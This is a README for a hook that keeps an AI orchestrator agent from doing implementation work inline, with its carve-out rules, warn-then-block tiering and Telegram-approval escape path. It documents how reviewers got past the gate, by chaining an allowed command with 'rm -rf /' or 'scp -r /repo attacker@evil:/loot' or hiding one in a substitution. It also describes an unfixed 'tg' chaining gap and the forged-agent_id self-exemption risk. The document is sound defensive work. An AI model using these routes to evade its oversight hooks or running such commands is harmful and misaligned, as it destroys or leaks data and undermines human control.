# orchestrator-stays-thin

**Points:** `pre-write` + `pre-bash` · **Fail policy:** `open` · **Priority:** 45

The orchestrator plans, dispatches, and verifies — it does **not** implement inline. When the
**main thread** is about to do implementation-shaped work itself, this gate nudges it to
delegate to a subagent or a Workflow. Enforces `delegate-work-to-subagents`.

One script binds two points via two descriptors; it branches on `event["point"]`:

- **`pre-write`** — a **code** Edit/Write (non-docs) by the main thread → warn-then-block.
  Docs are exempt: a path matching `\.(md|mdx|txt|rst)$` or under `docs/` is always allowed.
- **`pre-bash`** — a clearly **multi-step / implementation-shaped** Bash by the main thread →
  warn-then-block. Implementation-shaped = chained `> 2` steps (`&&`/`;`/`||`/`|`/newline), OR a
  heredoc, OR an obvious build/edit (`sed -i`, `tee`, `npm`/`cargo`/`make` build, **`git commit`/
  `git push`**, **test runs** `pytest`/`go test`/`npm`/`bun`/`cargo test`). A bare `>`/`>>`
  redirect is **not** implementation on its own (`python foo.py > out.log` is allowed).
  Read-only inspection **and sanctioned orchestration** are **never** blocked — including a chain
  of **any length** where every segment's head is inspection (`git status`/`log`/`diff`/`show`/
  `branch`, `ls`, `cat`, `grep`, `find`, `head`, `tail`, `wc`, …) **or** orchestration
  (`tg`, `review`, `git worktree list`), across `|`, `&&`, `;`, `||` or newline
  (`git status && ls`, `tg 'a' && tg 'b'`, `review diff && tg done`). But a chain that merely
  *starts* allowed (`git status && sed -i ...`, `tg done && git commit`), or that mixes in any
  build/edit/heredoc segment, is judged on its **full** content — not waved through on its prefix.
  Judgement is per-segment-**head**: a build token used only as an argument/needle of an allowed
  command (`cat tee.log`, `grep cargo notes`, `git log | rg gh`) stays allowed; only a
  build/edit/commit/`gh` *at a segment head* counts.

  **ALL `gh` is delegated (Alex tg#7103).** `gh ship`, `gh pr checks`/`view`, `gh run`, `gh api`
  — every gh subcommand — is implementation the orchestrator hands to a subagent, not inline work.
  This **reverts** the earlier `gh ship`/read-only-`gh` carve-out (agent-tools#159/#162): shipping
  a gated PR *and* CI/PR verification are a subagent's job. `gh` is not in the allow-list; it is an
  impl-signal, so an inline `gh ship 605` warn-then-blocks exactly like `git commit`. A dispatched
  subagent (`agent_id` present) is exempt and runs gh/ship freely — the gate governs the
  orchestrator only.

  **UPDATE (Alex tg#9977, agent-tools#159): one narrow exception restored — a genuinely UNCHAINED
  `gh ship <PR#>`.** The orchestrator may run the gated merge itself inline again, matched only on
  the literal shape `gh ship <bare-PR-number>` (head `gh`, next token exactly `ship`, next token
  all-ASCII-digits; everything AFTER that — not just flags/redirects but any further bare token
  too — unrestricted) **AND only when that is the WHOLE command line** — no `&&`/`;`/`||`/`|`/
  bare-`&`/newline anywhere (agent-tools#363: narrowed from a per-segment grant to a per-LINE one
  after an adversarial review found the per-segment version let a companion this file has no named
  mutation pattern for — `gh ship 205; rm -rf /`, `chmod`, `scp`, … — through completely
  unblocked). `gh ship` with no PR number, `gh ship abc`, `gh ship <PR#>` sharing a line with
  ANYTHING else (even a trailing `| tail` or a leading `cd repo &&`), and every OTHER gh subcommand
  (`gh pr merge`, `gh run`, `gh pr checks`/`view`, `gh api`, …) still delegate — see "`gh ship
  <PR#>` — restored narrow carve-out" below for the full matrix.

  **UPDATE (Alex, direct Telegram authorization, agent-tools#159 thread): the `tg` carve-out is
  now formalized as an explicit predicate, replacing the old plain regex.** `tg` (send text,
  `--file`, `--photo`, `--format html`, `--tag`, `--reply-to`, `voice setup`, and every other
  tg-cli subcommand) has been sanctioned for the orchestrator since agent-tools#164 — scope
  unchanged, and NOT narrowed like `gh ship` (Alex: *"все команды tg-cli"* / "ALL tg-cli commands",
  explicitly broader than the single-shape gh-ship exception). This revision REPLACES `ORCH_ALLOW`'s
  old plain `tg\b` regex with `_is_tg_command`, a shlex-based predicate consulted by
  `_seg_is_allowed` the same way `_is_gh_ship_command` is — allow-side only, since `tg` (unlike
  `gh`) was never an impl-signal head, so there is nothing to exempt on that side — bare `tg` +
  self-contained env-prefix skip only, deliberately NO
  path-qualification (two review rounds concluded that adds unsafe or illusory scope, not real
  narrowing) — and, as a consequence, fixes agent-tools#370 for the `tg` case (a hyphen-suffixed
  lookalike like `tg-foo` no longer matches). See "`tg` —
  formalized carve-out" below.

## Per-repo opt-out (Alex tg#5743)

Default **ON** (opt-OUT — this gate has always been always-on, so an un-enrolled repo keeps
firing, no regression). A repo that legitimately does inline work on main (e.g. `3d-cli`)
exempts itself:

- `agent_hooks.orchestrator_only: false` in the repo's committed `rig.yaml` (rig-provisioned), or
- `RIG_ORCHESTRATOR_ONLY=0` (session/CI override).

This mirrors the opt-IN per-repo knob of the sibling `worktree-only-writes` guard.

**`gh` is delegated, not carved out (Alex tg#7103 — reverts #159/#162).** An earlier design gave
`gh ship` (and read-only `gh` reads) an *orchestrator* carve-out so the main thread could ship a
gated PR and verify CI inline. The CTO reversed that: the orchestrator delegates **all** `gh` to a
subagent — shipping *and* CI/PR verification included. So `gh ship`, `gh pr checks`/`view`,
`gh run`, `gh api` (GET or mutation) are each an impl-signal that warn-then-blocks for the
orchestrator, single or chained, with or without `cd`/read-only plumbing (`gh ship 605 2>&1 | tail
-30` blocks; a subagent runs it). Per-segment-head discipline is unchanged: `gh` as a
substring/needle (`grep 'gh ship' log`, `git log | rg gh`) is **not** a gh command and exempts
nothing. The **dispatched subagent** (`agent_id` present) is the one meant to verify and is
exempt for everything.

**UPDATE (Alex tg#9977, agent-tools#159; narrowed by agent-tools#363):** a genuinely UNCHAINED
`gh ship <PR#>` — the gated merge itself, matched narrowly on a bare PR-number argument, as the
WHOLE, sole command on the line — was restored as a sanctioned orchestrator exception. See
"`gh ship <PR#>` — restored narrow carve-out" below. Every OTHER gh shape (including `gh ship`
with no PR number, and `gh ship <PR#>` chained with anything else at all) is still exactly as
described above: an impl-signal that warn-then-blocks.

**Report / verify carve-out — `tg` + read-only inspection (coordinator):** reporting to the user
and *read-only* verification stay at orchestrator altitude and must **not** require a subagent. A
line whose every segment head is `tg` (bare or env-prefixed, via `_is_tg_command` — see "`tg` —
formalized carve-out" below), `review`, `git worktree list`,
read-only inspection (incl. system-info `df`/`du`/`lsblk`/`free`/`ps`/… and filters
`jq`/`sort`/`cut`/…), or `cd` is never warned or blocked, of **any** length — there is no
minimum-count or specific-source requirement, it's a per-segment check
(`all(_seg_is_allowed(s) for s in segments)`), so a chain can be all-`tg`, all-read-only, or any
mix: `tg --format html '…' | tail -3 | grep merged`, `cat status.json | jq .title | head`,
`tg done; git status; git log`, `tg --file report.pdf 'caption'`.
Same per-segment discipline — a build/edit, heredoc, substitution, bare-`&`, mutating companion, or
any **`gh`** head forfeits it (`tg done && sed -i …`, `gh pr view && git push`, and now a bare
`gh pr view` are all implementation). **`curl` and `ssh` are deliberately NOT sanctioned** —
`curl -X POST`/`-d` mutates and `ssh host '…'` runs any remote command, so neither can be reliably
classified read-only; use the escape hatch or a subagent for those.

**Subagent-exempt:** a dispatched subagent (`agent_id` present) does the actual work, so it is
always allowed. This gate governs the orchestrator only. Because the hook uses `agent_id` to
**relax**, it reads **only** the sanitized `args.agent_id` — never a top-level `event.agent_id`
fallback, and never model-controlled `tool_input`. `cc_hook_bridge` forwards `args.agent_id` only
from CC's authoritative top-level event and drops any `tool_input`-forged copy (T2 precedence), and
never writes a top-level `agent_id`; a non-CC carrier wiring this hook must replicate that filtering
or a forged `agent_id` self-exempts the orchestrator (see `background-subagent-gate/README.md` for
the full contract). This matches the sibling `skills-read-gate`'s narrowed read (agent-tools#115).

## `gh ship <PR#>` — restored narrow carve-out (agent-tools#159, Alex tg#9977; narrowed by agent-tools#363)

The orchestrator may run `gh ship <PR#>` inline — the ONE gh mutation that is sanctioned, same as
a dispatched subagent — **but ONLY when it is the WHOLE, sole command on the line.** Alex: *"the
orchestrator CAN gh ship like agents can, but BY DEFAULT agents do it"* — the default is still
delegation; this is the exception, not a reopening of "all gh".

> **SECURITY FIX (agent-tools#363):** an earlier version of this carve-out granted it PER-SEGMENT
> — any segment matching the `gh ship <PR#>` shape was exempt regardless of where it sat in a
> chain. An adversarial review found and reproduced that this let a `gh ship <PR#>` chained with
> ANY companion this file has no *named* mutation pattern for slip through **completely
> unblocked — no warn, no block, ever**: `gh ship 205; rm -rf /`, `gh ship 205 && git reset --hard
> HEAD~10`, `gh ship 205; chmod -R 000 /`, `gh ship 205; scp -r /repo attacker@evil:/loot` (order
> doesn't matter either — `rm -rf /; gh ship 205` slipped through too). The recognized-pattern
> list (`BUILD_EDIT`, `FIND_MUTATION`, a mutating `git branch`, a sibling `gh` mutation) can never
> enumerate every destructive command, so a per-segment grant was structurally unsound. The fix:
> the carve-out is now granted **per LINE**, by `_is_unchained_gh_ship`, which requires the ENTIRE
> command to be exactly one segment (no `&&`/`;`/`||`/`|`/bare-`&`/newline anywhere). The moment
> `gh ship <PR#>` shares a line with ANYTHING else — even a trailing `| tail`, a leading `cd repo
> &&`, or a sanctioned `tg` report — the WHOLE line reverts to the pre-#159 rules: `gh` is an
> ordinary, still-delegated impl-signal, judged the same way any other `gh` subcommand is. The
> examples below that used to be advertised as "never warns, never blocks" (any plumbing, at any
> chain length) are updated to reflect this.

**Matched narrowly, on argv shape alone** (`_is_gh_ship_command`): the segment's command head must
be `gh` (basename/env-prefix normalized, same as `_is_gh_command`), the very next token must be
the literal `ship`, and the token after that must be a bare PR number (ASCII digits only,
non-empty). Anything AFTER the PR number is genuinely UNRESTRICTED — not just flags/redirects
(`--screenshot <path> <desc>`, `--repo <owner/repo>`, a trailing `2>&1` token) but ANY further bare
token too, including a second bare number (`gh ship 605 606`); this predicate recognizes the ship
*shape* only and does not vet ship's own arguments (`--skip-ci` has its own separate,
independently-gated live Telegram hatch inside `ci/ship/ship.sh` — this gate is not the place to
duplicate that; a second PR number is refused downstream by `ship.sh`'s own arg parser — "the lone
bare arg" — a second, independent gate this hook does not need to replicate). This predicate alone
is NOT the carve-out, though — see `_is_unchained_gh_ship` above for the whole-line gate that
actually decides whether it applies.

**What matches (never warns, never blocks — genuinely UNCHAINED, no operators anywhere on the line):**
- `gh ship 605`
- `gh ship 605 --screenshot out.png "desc"`
- `gh ship 605 --repo alex-mextner/agent-tools`
- `gh ship 605 > ship.log 2>&1` (a plain redirect is NOT a chain operator — still matches)
- `GH_PAGER=cat gh ship 605` (env-prefixed)
- `/usr/bin/gh ship 605` (path-qualified)
- `gtimeout 60 gh ship 605` (wrapper-stripped, same as any other command)

**What does NOT match — falls through to the general `gh` deny, still warn-then-blocks:**
- `gh ship` (no PR number)
- `gh ship abc` / `gh ship --help` (non-numeric argument)
- `gh ship $PR` / `gh ship "$PR_NUMBER"` — the hook sees the LITERAL pre-expansion text, so a
  genuinely numeric PR passed through a shell variable still misses (no shell runs before this
  hook inspects the string). Pass the literal digits: `gh ship 605`, not a variable.
- `gh ship --repo o/r 605` (a flag BEFORE the PR number — the number must be the token
  immediately after `ship`; `gh ship 605 --repo o/r`, number first, DOES match)
- `gh pr merge 605`, `gh run list`, `gh pr checks 605`, `gh api …` — every OTHER gh subcommand
- `gh ship 605 'oops` (an unbalanced-quote segment shlex cannot parse — conservative fallback)
- **`gh ship 605 | tail -30`** / **`cd /repo && gh ship 605`** / **`gh ship 605 && tg 'shipped'`**
  / any other chain, no matter how innocuous the companion looks — CHAINED at all, regardless of
  what joins it (agent-tools#363: this is the behavior that changed)
- **`gh ship 605;`** / **`gh ship 605 &`** — a TRAILING separator with nothing meaningful after it
  disqualifies too, not only an internal one; a trailing `&` in particular would background the
  merge, losing its synchronous exit status (agent-tools#363, Fable review round 2)
- **`gh ship 605 $(rm -rf /)`** / **`` gh ship 605 `rm -rf /` ``** / **`gh ship 605 <(rm -rf /)`**
  / **`gh ship 605 >(scp -r /repo attacker@evil:/loot)`** — ANY live substitution at all (`$(…)`,
  a backtick, `<(…)`, or `>(…)`), mutating or not, disqualifies the WHOLE line (agent-tools#363,
  Opus review round 2 — see the next paragraph)
- a heredoc anywhere on the line (unchanged from the original #159 hardening)

**Does not launder a mutation elsewhere on the line** (agent-tools#159's original hardening;
mechanism updated by agent-tools#363, guarantee strengthened for lines that a `gh ship` grant
could otherwise have waved through): a `gh ship 605` tacked onto ANY other command — a build/edit
(`sed -i … && gh ship 605`), a recognized companion mutation (`gh ship 605 && git push`), an
UNRECOGNIZED companion mutation this file has no named pattern for (`gh ship 605 && rm -rf /`), a
mutation smuggled in a substitution — command (`gh ship 605 $(git push origin main)`) OR process
(`gh ship 605 <(git push origin main)`) — a sibling gh mutation (`gh ship 605 | gh pr merge 606`),
behind a bare `&` (`gh ship 605 & git push`), or a heredoc anywhere — still warn-then-blocks on the
line's full content. Previously this was true only for companions matching a NAMED mutation
pattern (the per-segment design's actual gap); for a line whose only path to "allowed" was the
`gh ship` grant, it is now true regardless of what the companion is or whether it matches a NAMED
pattern — the carve-out simply does not apply to any multi-segment (or substitution-carrying) line
at all, so there is no ship-specific allow-list left to launder past. This does **not** mean the
gate now catches every unrecognized mutation on every line, full stop — a 2-segment chain fronted
by a DIFFERENT sanctioned head (`tg`, `review`) with an unrecognized companion, or a bare
unrecognized command with no chain at all, still falls through to the file's pre-existing,
unchanged default (see "`tg` — formalized carve-out" below for that boundary, deliberately not
touched by this fix). A sanctioned, genuinely UNCHAINED segment's own argument TEXT merely
*looking* like a mutation (`gh ship 605 tee`) does NOT block — `tee` there is inert text, never an
executed command, and the whole-line grant recognizes ship's argv shape, not "no mutation-shaped
substring in the text". Nor does the substitution veto distinguish benign from mutating content —
a previously-allowed BENIGN live substitution such as `gh ship 605 --note "$(date)"` now also
delegates (a deliberate, conservative narrowing: telling "benign" from "mutating" substitution
content is exactly the unenumerable-pattern-list problem this fix exists to avoid).

**Scope note:** ship's own flags are unvetted, so an unchained `gh ship 605 --repo some/other-repo`
is sanctioned — an inline merge into a DIFFERENT repository than the orchestrator's cwd. Accepted
within this gate's stated threat model (a cooperative orchestrator, not an adversarial one — see
"Fail-open, on purpose" below), not an oversight.

**No more chaining note:** unlike the OLD per-segment design, `gh ship 605 && gh ship 606` is now
DELEGATED (a 2-segment chain), not sanctioned — each merge still gets its own full
`ci/ship/ship.sh` pipeline (green CI, review quorum, screenshot, etc.) if run separately as two
unchained `gh ship <PR#>` calls; running several ships as ONE chained line is no longer a shortcut
this gate grants inline.

## `tg` — formalized carve-out (tg-carveout-159, Alex direct Telegram authorization)

`tg` (the tg-cli Telegram reporting tool) has been sanctioned for the orchestrator to run inline
since agent-tools#164 — every tg-cli subcommand, every flag. That stays **unchanged in scope**.
Alex, asked directly whether the orchestrator should get the same `gh ship` treatment for `tg`,
was explicit that `tg` should be **broader**, not narrower: *"оркестратор ещё и tg:* должен уметь,
т.е. все команды tg-cli"* — "the orchestrator should ALSO be able to run tg:*, i.e. ALL tg-cli
commands". Unlike `gh ship <PR#>` (one gh mutation carved out of an otherwise-delegated command),
`tg` has no subcommand this gate withholds — send text, `--file`, `--photo`, `--format html`,
`--tag`, `--reply-to`, `voice setup`, and everything else tg-cli exposes are all sanctioned, and
always have been.

**What changed: the old `ORCH_ALLOW` plain `tg\b` regex was REPLACED by `_is_tg_command`, a
shlex-based predicate — not kept alongside it.** An earlier draft of this PR added the predicate as
a pure addition next to the regex, reasoning it was lower-risk; review (Fable, round 3) correctly
identified that as the worst of both worlds — since `ORCH_ALLOW` was checked FIRST in
`_seg_is_allowed`'s OR-chain and matched a strict superset of what the new predicate could ever
grant, the addition was unreachable dead code that shipped zero actual behavior while adding a
second, silently-disagreeing definition of "is this segment `tg`". The predicate now REPLACES the
regex outright and is the SOLE authority — consulted by `_seg_is_allowed` the same way
`_is_gh_ship_command` is, but allow-side only: unlike `gh`, `tg` was never an impl-signal head, so
there is nothing to exempt in `_seg_is_impl_signal`.

**This also fixes agent-tools#370 for the `tg` case.** `\b` is a WORD-boundary, which also fires
before a hyphen, so the old regex incorrectly matched `tg-foo` — a DIFFERENT command — as
sanctioned orchestration. `_is_tg_command` is basename-exact (`toks[i] == "tg"`), so `tg-foo` is
now correctly rejected end-to-end: allowed alone or in a 2-segment chain (the same generic
single/short-chain gray zone any unclassified command gets under the "chained >2 steps" doctrine —
`tg-foo bar | tail` is still allowed, `tg-foo bar | tail -3 | head -1` warn-then-blocks), exactly
like any other non-orchestration command. `review`'s matching `\b` quirk (`review-foo`) is
**unchanged** — the surviving half of #370, out of scope for this PR.

**Deliberately NO path-qualification, despite `_is_gh_command` accepting any path — resolved by
two review rounds, not shipped as a guess.** Round 1 (Fable) found that mirroring
`_is_gh_command`'s blanket basename normalization over-grants in the UNSAFE direction here:
`_is_gh_command` is a DENY-direction predicate (over-matching there only routes more things to a
subagent, the safe failure mode), but a match in `_is_tg_command` means "never even warn" — a
RELATIVE path (`./tg`, `scripts/tg`) is trivial to place anywhere near the working directory. A
first fix attempt restricted the grant to ABSOLUTE paths only, reasoning that implies "a real,
already-installed binary at a fixed system location." Round 2 (Opus + Fable) disproved that
reasoning empirically: `/tmp/tg` or any other writable absolute path passes just as easily as a
relative one — the restriction narrowed nothing real. The remaining option, a small allowlist of
known bin directories (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin`), was checked against
this machine's ACTUAL `tg` install and rejected: `which tg` resolves to `~/.files/bin/tg`, a
dotfiles-managed location not on any short "standard" list — proving a hardcoded allowlist would be
both unsafe-in-theory and unreliable-in-practice. Given this gate's own stated threat model
(discipline, not a security boundary — see "Fail-open, on purpose" below) and that the practical
need (Alex's ask) is already fully met by subcommand breadth alone, path-qualification was dropped
entirely.

**What matches (never warns, never blocks, AT ANY CHAIN LENGTH — broader than `gh ship <PR#>`,
which is unchained-only since agent-tools#363; `tg`'s scope was never narrowed):**
- `tg 'shipped'`, `tg --format html '<b>done</b>'`, `tg --file report.pdf 'caption'`
- `tg --photo screenshot.png 'caption'`, `tg --tag report 'x'`, `tg --reply-to 12345 'answer'`
- `tg voice setup`, `tg help format`
- `TG_BOT_TOKEN=x tg 'shipped'` (env-prefixed)
- `gtimeout 30 tg 'shipped'` (wrapper-stripped, same as any other command)
- `tg 'a' | tail -3 | head -1`, `tg 'a' && review diff && git worktree list` (companions, any length)

**What does NOT match:** any path-qualified head — `/opt/homebrew/bin/tg`, `./tg`, `scripts/tg`,
`../tg` — relative OR absolute, falls through to the general (unclassified-command) treatment
instead (allowed alone or in a 2-segment chain, warn-then-blocks once chained into 3+ segments —
the same "chained >2 steps" doctrine any unclassified command gets). An unparseable
(unbalanced-quote) segment also does NOT match — this predicate denies-by-default on uncertain
input, matching `_is_gh_ship_command`'s own fallback direction (the old regex's "grant anyway"
fallback was justified only by parity with itself; once it became the sole authority that parity
argument no longer applied).

**Does not launder a *recognized* mutation elsewhere on the line** — `tg` keeps its ORIGINAL
per-segment design, deliberately UNCHANGED by agent-tools#363 (which touched only `gh ship`'s
wiring, per the CTO's explicit scope: fix `gh ship`, don't touch `tg`): a `tg` call tacked onto an
implementation chain does not exempt the rest of it — a build/edit (`sed -i … && tg 'done'`), a
*recognized* companion mutation (`tg 'done' && git push`, `tg 'done' && npm run build`), a
mutation smuggled in a substitution (`tg done $(sed -i 's/a/b/' f)`), behind a bare `&` (`tg
'done' & git push`), a sibling `gh` mutation, a `(...)` subshell group, or a heredoc anywhere still
warn-then-blocks on the line's full content.

**Known, PRE-EXISTING gap, not touched by agent-tools#363, not claimed fixed here — tracked as
agent-tools#374:** `tg`'s per-segment grant has the SAME theoretical companion-mutation blind spot
`gh ship` had before #363 — `tg` is allowed by `_seg_is_allowed` on its own segment; an
*unrecognized* companion (one matching none of `BUILD_EDIT`/`FIND_MUTATION`/a mutating `git
branch`/a sibling `gh` mutation, e.g. `rm`/`chmod`/`scp`/`mv`) in a 2-segment chain (`tg 'done'; rm
-rf /`) falls through every check to allowed, for the identical structural reason `gh ship 205; rm
-rf /` did. This is NOT new, NOT widened, and NOT closed by this PR — the adversarial review that
reported the `gh ship` regression separately confirmed this `tg` gap predates #363 unchanged, and
the fix was explicitly scoped to `gh ship` only; agent-tools#374 tracks the deferred decision
(structural classifier-level fix vs. narrowing `tg` to per-line, pending Alex's call given `tg`'s
any-chain-length scope was explicitly authorized). Chain-splitting makes a
*recognized* mutation its OWN segment, and the substitution-liveness scanner catches a LIVE `$()`/backtick/
`<()`/`>()` regardless of the outer segment's head. A `tg` argument's own TEXT merely *looking*
like a mutation (`tg 'saw $(git push) in logs'`, single-quoted — literal, never executes) does NOT
block — the pre-existing precedent, unchanged.

**Known, pre-existing gap, not introduced here:** a leading `VAR=val` env-prefix is accepted, and
an env prefix that affects command resolution (`PATH=`, `LD_PRELOAD=`) is not screened. This is
shared uniformly by every predicate in this file — `gh ship`, `_is_gh_command` — via
`_strip_wrappers`'s env-assignment stripping upstream of every one. Fixing it would mean changing
that shared helper, outside this predicate's scope.

**Subagent-exempt, same as everything else in this gate:** a dispatched subagent (`agent_id`
present) runs `tg` freely regardless of this predicate — it was never gated for a subagent.

## Tiering — WARN then BLOCK

The **first** offense in the TTL window **WARNs** (allow + message); a **repeat** in the
window **BLOCKs**. The tier is a marker file keyed by a hash of `(cwd, point)`, so `pre-write`
and `pre-bash` tier **independently** — a write WARN does not prime a bash BLOCK (or vice versa):

- `ORCH_THIN_MARKER_DIR` — marker dir (default `~/.cache/agent-tools/orchestrator-thin`)
- `ORCH_THIN_TTL_S` — warn-suppression window in seconds (default `900`)

This delivers the doctrine's "WARN then BLOCK" rather than a hard wall on the first inline edit.

> The env-configured marker dir is read at import time; CC re-invokes the script per call, so a
> per-session env change is always picked up on the next call — this is fine, not a footgun.

## No self-service bypass — external Telegram approval only

There is **no** env-var or inline escape hatch any more. The old `ALLOW_ORCHESTRATOR_WORK=1` +
`ALLOW_ORCHESTRATOR_WORK_REASON` env and the `# orchestrator-ok:` inline sentinel let the very
orchestrator this gate constrains grant itself an exception — security theater, not a permission
gate. Both were removed. (This is distinct from the per-repo **enable** knob
`RIG_ORCHESTRATOR_ONLY` / `agent_hooks.orchestrator_only`, which a repo owner — not the
constrained agent — sets to opt a repo out entirely; that stays.)

The gate still **WARNs first**; only a would-be **BLOCK** (a repeat offense within the TTL
window) is **deny-by-default**. For a genuine exception, ASK the human, or request a one-time
Telegram approval with a written justification:

```bash
# pre-bash point: the inline VAR=… prefix is parsed out of the command string, so it works
# even when the gated command is not first (`cd repo && RIG_HATCH_REQUEST_…="why" cmd`).
RIG_HATCH_REQUEST_ORCHESTRATOR_STAYS_THIN="trivial config tweak, no subagent worth it" \
  sed -i 's/a/b/' file
```

The inline prefix form works **only at the pre-bash point** (the hook parses the leading
assignment out of the command string; a pre-bash hook runs before the shell evaluates the
`VAR=x cmd` prefix, so the value never reaches its `os.environ`). At the **pre-write** point
(a code write via Edit/Write) there is no shell command to carry the prefix — the variable must
be **exported** into the harness environment so the hook reads it from `os.environ`. An exported
value takes precedence over an inline one at either point.

If the env var is unset, no Telegram call is made and the block simply stands. If it is present
but blank, whitespace-only, or a bare flag value (`1`/`true`/`yes`/`on`), the hook does not
contact Telegram and denies — a bare `1` is not a justification. A real justification runs
`tg-ctl ask` through a trusted absolute path (never ambient `PATH`) with the question as a JSON
ButtonRequest on stdin; only a reply on stdout whose decision is explicitly `allow` allows — an
empty or unparseable reply, an explicit deny, any nonzero exit, launch error, or timeout denies
(`tg-ctl ask` exits 0 regardless of outcome, so a clean exit alone is never approval). An agent
can *request*, not self-grant.

## Fail-open, on purpose

`on_error: "open"`. Delegation discipline, not a security boundary — a crash must never wedge
the main thread's ability to act.

## Test

The hook's exit code is the canonical signal (`0` allow · `10` block). Capture it on its OWN
line right after the pipe so what's printed is the HOOK's exit, not `echo`'s:

```bash
chmod +x orchestrator_stays_thin.py
# first offense → WARN (allow + message); repeat in the window → BLOCK
echo '{"point":"pre-write","cwd":"/r","args":{"file_path":"/r/src/a.ts"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # → exit=0 (first offense, WARN)
echo '{"point":"pre-write","cwd":"/r","args":{"file_path":"/r/src/a.ts"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # → exit=10 (repeat → BLOCK)

echo '{"point":"pre-write","cwd":"/r","args":{"file_path":"/r/README.md"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # docs → exit=0 (allow)
echo '{"point":"pre-bash","cwd":"/r","args":{"command":"git status"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # single read-only → exit=0 (allow)

echo '{"point":"pre-bash","cwd":"/r","args":{"command":"gh ship 605"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # UNCHAINED gh ship <PR#> → exit=0 (allow, never warns — agent-tools#159)
echo '{"point":"pre-bash","cwd":"/r","args":{"command":"gh ship 605 | tail -3"}}' \
  | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # CHAINED gh ship <PR#> → exit=0 (first offense, WARN — agent-tools#363:
                          # the carve-out is per-LINE, not per-segment; any companion delegates)
echo '{"point":"pre-bash","cwd":"/r","args":{"command":"gh pr merge 605"}}' | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # every OTHER gh subcommand → exit=0 (first offense, WARN)

echo '{"point":"pre-bash","cwd":"/r","args":{"command":"TG_BOT_TOKEN=x tg --format html x"}}' \
  | ./orchestrator_stays_thin.py
rc=$?; echo "exit=$rc"   # env-prefixed tg → exit=0 (allow, never warns — tg-carveout-159)
```
